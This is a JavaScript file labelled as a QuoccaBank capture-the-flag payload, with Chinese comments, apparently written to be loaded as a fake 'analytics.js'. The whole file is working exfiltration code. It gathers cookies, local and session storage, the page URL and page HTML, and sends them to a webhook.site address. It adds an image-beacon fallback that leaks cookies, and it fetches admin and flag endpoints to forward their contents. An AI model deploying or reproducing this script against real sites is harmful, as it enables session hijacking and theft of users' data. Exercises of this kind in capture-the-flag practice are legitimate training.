// QuoccaBank CTF Payload
console.log("Malicious analytics.js loaded!");

// 收集所有可能包含flag的信息
const data = {
    timestamp: new Date().toISOString(),
    url: location.href,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    pageTitle: document.title,
    pageContent: document.documentElement.outerHTML.substring(0, 10000)
};

// 发送到webhook
fetch('https://webhook.site/73a66cc1-d951-455e-8a6c-a397eeda1536/flag-exfil', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify(data)
}).then(response => {
    console.log('Data exfiltrated successfully');
}).catch(error => {
    console.error('Exfiltration failed:', error);
    
    // 备用方案
    const img = new Image();
    img.src = 'https://webhook.site/73a66cc1-d951-455e-8a6c-a397eeda1536/backup?cookies=' + encodeURIComponent(document.cookie);
});

// 尝试访问admin端点
['/admin', '/flag', '/dashboard', '/profile'].forEach(endpoint => {
    fetch(endpoint).then(r => r.text()).then(content => {
        if (content && content.length > 10) {
            fetch('https://webhook.site/73a66cc1-d951-455e-8a6c-a397eeda1536/admin-content', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    endpoint: endpoint,
                    content: content.substring(0, 5000)
                })
            });
        }
    }).catch(() => {});
});
